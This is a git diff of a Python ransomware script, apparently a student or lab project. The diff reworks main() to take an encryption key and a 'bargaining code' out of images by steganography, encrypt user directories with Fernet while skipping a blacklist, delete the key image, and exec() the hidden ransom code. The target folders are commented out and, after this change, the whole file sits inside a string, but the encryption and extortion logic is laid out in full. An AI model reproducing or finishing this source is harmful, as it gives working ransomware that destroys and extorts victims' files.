@@ -1,4 +1,4 @@
-#import os
+'''#import os
 #from cryptography.fernet import Fernet
 #from extract import extract_file
 
@@ -22,7 +22,7 @@ def encrypt_file(filename: str, key: str):
         encrypted_file.write(ciphertext)
 
 
-'''def process_directory(directory: str, key: str, blacklist: list[str]):
+def process_directory(directory: str, key: str, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files encrypted.
@@ -43,21 +43,34 @@ def encrypt_file(filename: str, key: str):
                 file_path = os.path.join(root, file)
                 # Encrypts the file given the newly generated filepath
                 encrypt_file(file_path, key)
-                print(file)'''
+                print(file)
 
 
 def main():
     # Extracts the key from a specified image
-    # TODO: Update the name of the images as needed
-    with open ("images.txt", "r") as file:
+    with open("passphrase.txt", "r") as file:
+        lines = file.readlines()
+        passphrase = lines[0].strip("\n")
+
+    with open("images.txt", "r") as file:
         lines = file.readlines()
         image_containing_key: str = lines[0].strip("\n")
+        image_containing_bargaining_code: str = lines[2].strip("\n")
 
     try:
-        if os.path.exists(image_containing_key):
-            pass
+        key_found: bool = os.path.exists(image_containing_key)
+        bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
+        if key_found and bargain_code_found:
+            key: str = extract_file(image_containing_key, passphrase)
+            code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
         else:
-            raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
+            if not key_found and not bargain_code_found:
+                filler = f"{image_containing_key} and {image_containing_bargaining_code} don't"
+            elif not key_found:
+                filler = f"{image_containing_key} doesn't"
+            else:
+                filler = f"{image_containing_bargaining_code} doesn't"
+            raise FileNotFoundError(f"The image name/path {filler} exist in the current directory."
                                     f"Either the name fed to the variable in the code to be updated or the image "
                                     f"specified just doesn't exist.")
     except FileNotFoundError as fnfe:
@@ -67,11 +80,6 @@ def main():
         print(f"An unexpected error occurred: {e}")
         return
 
-    with open("passphrase.txt", "r") as file:
-        lines = file.readlines()
-        passphrase = lines[0].strip("\n")
-    key: str = extract_file(image_containing_key, passphrase)
-
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
     # TODO: Verify, but SHOULD prevent the code from encrypting itself
@@ -80,10 +88,10 @@ def main():
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
     directories_to_encrypt = [
-        #os.path.expanduser("~/Downloads"),
-        #os.path.expanduser("~/Documents"),
-        #os.path.expanduser("~/Pictures"),
-        #os.path.expanduser("~/Desktop")
+        # os.path.expanduser("~/Downloads"),
+        # os.path.expanduser("~/Documents"),
+        # os.path.expanduser("~/Pictures"),
+        # os.path.expanduser("~/Desktop")
     ]
 
     for directory in directories_to_encrypt:
@@ -96,12 +104,11 @@ def main():
     os.remove(image_containing_key)
 
     # Runs the bargaining application
-    if os.path.exists("bargain_with_user.py"):
-        exec("bargain_with_user.py")
-    elif os.path.exists("bargain_with_user.exe"):
-        exec("bargain_with_user.exe")
+    if os.path.exists(code_to_bargain_with_user):
+        exec(code_to_bargain_with_user)
     else:
-        raise FileNotFoundError("Neither the .py nor the .exe file for bargaining with the user were found...")
+        raise FileNotFoundError("The file for bargaining with the user was not found...")
 
 
 main()
+'''
